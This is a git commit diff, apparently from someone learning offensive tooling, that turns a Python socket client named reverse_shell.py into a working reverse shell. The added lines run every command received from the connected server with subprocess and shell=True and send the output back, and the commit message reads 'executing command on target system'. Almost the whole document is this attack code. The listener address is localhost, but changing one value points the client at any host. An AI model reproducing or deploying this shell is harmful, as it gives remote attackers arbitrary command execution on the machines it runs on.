6cc00842743639c37a01e51b288f8dff09c7a289
laevad <aldave.tabian@ustp.edu.ph>
2021-03-02 05:57:03 -0500

    executing command on target system

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,5 +1,6 @@
 #!/usr/bin/python
 import socket
+import subprocess # this allow us to input something in the cli
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
 sock.connect(("127.0.0.1", 54321))
@@ -7,10 +8,10 @@ print("connection establish to server")
 
 while True:
 	command = sock.recv(1024) # receive bytes
-	print(command)
 	if command  == "q":
 		break
 	else:
-		command_back = raw_input("input command: ")
-		sock.send(command_back)
+		process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
+		result = process.stdout.read() + process.stderr.read()
+		sock.send(result)
 sock.close()
